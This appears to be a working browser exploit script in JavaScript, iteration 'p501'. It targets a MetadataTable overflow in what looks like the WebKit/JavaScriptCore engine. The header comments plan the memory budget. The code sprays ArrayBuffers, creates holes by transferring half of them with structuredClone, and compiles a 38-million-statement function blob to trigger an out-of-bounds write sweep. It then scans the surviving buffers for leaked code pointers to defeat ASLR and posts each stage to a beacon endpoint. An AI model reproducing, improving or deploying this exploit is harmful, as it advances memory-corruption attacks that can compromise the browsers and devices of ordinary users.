// p501 — MetadataTable overflow: lean memory IIFE for ASLR leak
//
// V500 OOMed: 400 ABs (40MB) + 8000 targets + 146MB blob + 900MB AST > 1.2GB
// p142 succeeded (COMPILED-OK + CALLING) because it used less pre-spray memory.
//
// FIX: Minimal spray. Two phases separated by setTimeout to free memory.
//
// Phase A (low memory):
//   1. Define function with lazy parse: window.__fn=function(a){if(0){a();...38M...}window.__ok=1;}
//   2. This lazy-parses → just scans for matching } → ~146MB source + minimal overhead
//   3. Call the function: window.__fn(0)
//   4. Call triggers: re-parse body → full AST → bytecode → UnlinkedMetadataTable (overflow)
//      → CodeBlock → link → finishCreation → 4.3GB OOB sweep
//   5. if(0) prevents execution of calls. Function returns normally.
//   6. Sweep is DONE. AB spray happens AFTER.
//
// Phase B (after sweep):
//   BUT WAIT: we need ABs at specific addresses BEFORE the sweep.
//   The sweep writes FORWARD from MetadataTable. ABs must be at higher addresses.
//
// REVISED: spray BEFORE compile, but use fewer ABs.
//   100 ABs of 100,112B = ~10MB (not 40MB)
//   Transfer first 50 → holes (5MB freed)
//   GC → holes truly freed
//   Compile IIFE → MetadataTable fills hole → sweep hits surviving ABs
//
// Memory budget: 10MB spray + 146MB blob + 900MB AST + overhead ≈ 1070MB < 1200MB
//
// Beacon prefix: V501-
(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V501-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hexB(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexB(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═══ Phase 1: Lean AB spray ═══
  var BUF_SZ = 100112;
  var SPRAY_N = 100;  // Only 100 ABs = ~10MB

  var bufs = new Array(SPRAY_N);
  for (var i = 0; i < SPRAY_N; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  B('SPRAY', 'n=' + SPRAY_N);

  // Transfer first half to create holes
  var xferred = 0;
  for (var i = 0; i < SPRAY_N / 2; i++) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      xferred++;
    } catch(e) {
      if (xferred === 0) { B('XFER-ERR', e.message.substring(0,60)); break; }
    }
    bufs[i] = null;
  }
  B('XFER', 'n=' + xferred);

  // Create views on surviving ABs
  var views = [];
  for (var i = Math.floor(SPRAY_N / 2); i < SPRAY_N; i++) {
    if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
      views.push(new Uint8Array(bufs[i]));
    }
  }
  B('VIEWS', 'n=' + views.length);

  // ═══ Phase 2: setTimeout → GC → compile ═══
  setTimeout(function() {
    // GC to free transferred backing stores
    for (var g = 0; g < 10; g++) {
      var junk = [];
      for (var j = 0; j < 40000; j++) junk.push({x: j});
      junk = null;
    }
    B('GC-DONE');

    // Build the 38M function blob
    // TWO-STAGE: define function (lazy parse), then call it (triggers compile)
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);

    var parts = new Array(nC + 3);
    // Stage 1: define function with if(0) guard
    // Stage 2: call it immediately after
    parts[0] = 'window.__v501fn=function(a){if(0){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '}window.__v501ok=1;};window.__v501fn(0);';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', 'sz=' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onerror = function() {
      B('SCRIPT-ERR', '');
      B('DONE', 'script-error');
    };

    sc.onload = function() {
      // If we get here, the function was defined AND called successfully
      var ok = window.__v501ok ? 'OK' : 'FAIL';
      B('COMPILED', ok);

      if (ok !== 'OK') {
        B('DONE', 'compile-fail');
        return;
      }

      // Free the blob and function to reclaim memory for scanning
      URL.revokeObjectURL(url);
      window.__v501fn = null;
      sc = null;

      // Small GC to stabilize
      for (var g = 0; g < 3; g++) {
        var j = []; for (var k = 0; k < 20000; k++) j.push(k); j = null;
      }

      setTimeout(doScan, 100);
    };

    document.head.appendChild(sc);
    sc.src = url;
  }, 500);

  function doScan() {
    B('SCAN-START');

    // ═══ Scan AB views for non-zero bytes ═══
    var hitBufs = 0;
    var leakedPtrs = [];

    for (var vi = 0; vi < views.length; vi++) {
      var view = views[vi];
      if (!view) continue;

      // Sample for non-zero content
      var hasNZ = false;
      for (var q = 0; q < view.length && !hasNZ; q += 4) {
        if (view[q] !== 0 || view[q+1] !== 0 || view[q+2] !== 0 || view[q+3] !== 0) {
          hasNZ = true;
        }
      }
      if (!hasNZ) continue;
      hitBufs++;

      // Count non-zero bytes
      var nz = 0;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) nz++;
      }
      B('HIT-' + vi, 'nz=' + nz);

      if (hitBufs > 3) break;

      // Detect entry alignment
      var bestBase = -1, bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase += 4) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= view.length; off += 112) {
          if (u32(view, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }
      B('EBASE-' + vi, 'base=' + bestBase + ',hits=' + bestHits);

      // Extract thunk pointers at entry+24
      var ptrs = 0;
      for (var eOff = bestBase; eOff + 32 <= view.length && ptrs < 5; eOff += 112) {
        if (u32(view, eOff + 12) !== 0xFFFFFFFF) continue;
        var pOff = eOff + 24;
        if (view[pOff] === 0 && view[pOff+1] === 0 && view[pOff+2] === 0 && view[pOff+3] === 0 &&
            view[pOff+4] === 0 && view[pOff+5] === 0 && view[pOff+6] === 0 && view[pOff+7] === 0) continue;
        var h = hex8(view, pOff);
        B('THUNK-' + ptrs, 'off=' + pOff + ',val=0x' + h);
        if (leakedPtrs.length < 5) leakedPtrs.push(h);
        ptrs++;
      }

      // Also check m_bytecodeIndex at entry+68
      var idxs = 0;
      for (var eOff = bestBase; eOff + 72 <= view.length && idxs < 5; eOff += 112) {
        var iOff = eOff + 68;
        var val = u32(view, iOff);
        if (val !== 0 && val !== 0xFFFFFFFF) {
          B('IDX-' + idxs, 'off=' + iOff + ',val=' + val);
          idxs++;
        }
      }

      // Hex dump first 224 bytes of first hit
      if (hitBufs === 1) {
        var chunks = [];
        for (var off = 0; off + 8 <= 224 && off + 8 <= view.length; off += 8) {
          if (view[off]|view[off+1]|view[off+2]|view[off+3]|
              view[off+4]|view[off+5]|view[off+6]|view[off+7]) {
            chunks.push(off + ':0x' + hex8(view, off));
          }
        }
        if (chunks.length > 0) B('RAW', chunks.slice(0, 12).join(' '));
      }
    }

    B('RESULT', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length);

    if (leakedPtrs.length > 0) {
      B('ASLR-LEAK', 'ptr0=0x' + leakedPtrs[0]);
    } else if (hitBufs > 0) {
      B('SWEEP-HIT', 'no-ptrs-extracted');
    } else {
      B('NO-HIT');
    }

    B('DONE', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length);
  }
})();
